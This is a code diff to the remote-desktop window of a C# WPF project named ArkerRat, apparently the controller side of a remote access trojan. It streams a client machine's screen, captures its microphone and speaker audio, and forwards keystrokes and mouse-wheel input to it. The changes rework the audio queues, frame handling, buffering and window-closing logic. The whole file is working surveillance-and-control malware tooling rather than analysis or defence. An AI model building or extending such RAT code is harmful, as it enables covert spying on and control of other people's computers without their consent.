@@ -1,6 +1,4 @@
-﻿
-
-using ArkerRAT1;
+﻿using ArkerRatWpfVersion;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -30,24 +28,33 @@ namespace ArkerRatWpfVersion
         public RemoteDesktopWindow(RATHostSession session)
         {
             InitializeComponent();
+
+
             clientSession = session;
-            GlobalVariables.byteSize = 262144;
+            windowText.Content +=" - "+(clientSession.clientInfo.Split('\t'))[0];
+
+GlobalVariables.byteSize = 262144;
             lock (GlobalVariables._lock)
             {
-                clientSession.data = string.Empty;
+                clientSession.data = "§PingStart§§PingEnd§";
             }
 
             Task.Run(()=> FrameBuffer());
             Task.Run(()=> StartReceivingAudio());
             //ResetWhenTheDelayOfFramesIsToLarge();
 
-            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
             clientSession.remoteDesktopWindowIsAlreadyOpen = true;
             this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
             this.PreviewMouseWheel += new MouseWheelEventHandler(SendScrollToClient);
             remoteDesktopVideoFrame.Stretch = Stretch.Fill;
-
-
+            Task.Delay(300);
+            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
+        }
+        bool close = false;
+        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            if (!close)
+                e.Cancel = true;
         }
 
         private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
@@ -67,12 +74,29 @@ namespace ArkerRatWpfVersion
             await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
         }
 
-        private async void CloseWindow(object sender, RoutedEventArgs e)
+        public async void CloseWindow(object sender, RoutedEventArgs e)
         {
-            clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
+            await clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
             StopReceivingAudio();
             clientSession.remoteDesktopWindowIsAlreadyOpen = false;
+            frameQue = new ConcurrentQueue<string>();
+            clientAudioQue = new ConcurrentQueue<string>();
+
+
+
+            while (frameQue.Count > 0 || clientAudioQue.Count > 0)
+            {
+                await Task.Delay(100);
+            }
+            await Task.Delay(500);
+
+            lock (GlobalVariables._lock)
+            {
+                clientSession.data = "§PingStart§§PingEnd§";
+            }
+
             GlobalVariables.byteSize = 1024;
+            close = true;
             Close();
         }
 
@@ -122,7 +146,7 @@ namespace ArkerRatWpfVersion
        
 
         public ConcurrentQueue<string> frameQue = new ConcurrentQueue<string>();
-        public ConcurrentStack<string> clientAudioStack = new ConcurrentStack<string>();
+        public ConcurrentQueue<string> clientAudioQue = new ConcurrentQueue<string>();
 
 
 
@@ -135,24 +159,10 @@ namespace ArkerRatWpfVersion
 
                    if (!string.IsNullOrEmpty(temp))
                    {
-                       if (temp.Contains("§OA§")&&cAOVOn)
-                       {
-                        //Sort out the audio data
-                        temp = temp.Replace("§OA§", string.Empty);
-                           clientAudioStack.Push(temp);
-                       }else if(temp.Contains("§IA§") && cAIVOn)
-                    {
-                        temp = temp.Replace("§IA§", string.Empty);
-
-                        clientAudioStack.Push(temp);
-                    }
-                       else
-                       {
                         //Frame
-                           await Task.Run(()=>ReceiveFrameChunk(temp));
-                       }
+                           ReceiveFrameChunk(temp);
                    }
-               }
+            }
         }
 
    
@@ -167,8 +177,8 @@ namespace ArkerRatWpfVersion
 
 
 
-        private const int DelayThresholdMilliseconds = 1000;
-        private const int MaxBufferMilliseconds = 5000; // Maximum buffer size to prevent excessive buffering
+        private const int DelayThresholdMilliseconds = 1500;
+        private const int MaxBufferMilliseconds = 3000; // Maximum buffer size to prevent excessive buffering
         private int currentDelayMilliseconds = 0;
         private int desiredBufferMilliseconds = 500; // Initial buffer size
 
@@ -222,7 +232,8 @@ namespace ArkerRatWpfVersion
         {
             while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
             {
-
+                if (clientAudioQue.Count > 10)
+                    clientAudioQue = new ConcurrentQueue<string>();
 
                 string dataIn = string.Empty;
                 string dataOut = string.Empty;
@@ -230,11 +241,11 @@ namespace ArkerRatWpfVersion
                 bool inReceived = false;
                 bool outReceived = false;
 
-                Task inTask = Task.Run(() =>
+                Task inTask = Task.Run(async() =>
                 {
                     while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen && !inReceived && cAIVOn)
                     {
-                        if (clientAudioStack.TryPop(out dataIn))
+                        if (clientAudioQue.TryDequeue(out dataIn))
                         {
                             byte[] audioInBytes = Convert.FromBase64String(dataIn);
                             try
@@ -247,14 +258,15 @@ namespace ArkerRatWpfVersion
                                 // Handle the exception appropriately
                             }
                         }
+                        await Task.Delay(10);
                     }
                 });
 
-                Task outTask = Task.Run(() =>
+                Task outTask = Task.Run(async() =>
                 {
                     while (!cancellationToken.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen && !outReceived && cAOVOn)
                     {
-                        if (clientAudioStack.TryPop(out dataOut))
+                        if (clientAudioQue.TryDequeue(out dataOut))
                         {
                             byte[] audioOutBytes = Convert.FromBase64String(dataOut);
                             try
@@ -267,6 +279,7 @@ namespace ArkerRatWpfVersion
                                 // Handle the exception appropriately
                             }
                         }
+                        await Task.Delay(10);
                     }
                 });
 
@@ -296,8 +309,6 @@ namespace ArkerRatWpfVersion
                 {
                     await Task.Delay(10); // Delay to avoid hard looping
                 }
-
-               
             }
         }
 
@@ -353,19 +364,6 @@ namespace ArkerRatWpfVersion
             waveProvider.BufferLength = Math.Min(desiredBufferBytes, MaxBufferMilliseconds * waveProvider.WaveFormat.AverageBytesPerSecond / 1000);
         }
 
-
-
-
-
-
-
-
-
-
-
-
-
-
         private MemoryStream _frameStream = new MemoryStream();
         public async void ReceiveFrameChunk(string frameChunk)
         {
@@ -410,7 +408,7 @@ namespace ArkerRatWpfVersion
         }
 
         //_______
-        bool cAIVOn = false;
+        public bool cAIVOn = false;
         private void CAIVOn(object sender, RoutedEventArgs e)
         {
             cAIVOn= true;
@@ -422,7 +420,7 @@ namespace ArkerRatWpfVersion
     }
 
         //_______
-        bool cAOVOn = false;
+        public bool cAOVOn = false;
         private void CAOVOn(object sender, RoutedEventArgs e)
         {
             cAOVOn= true;
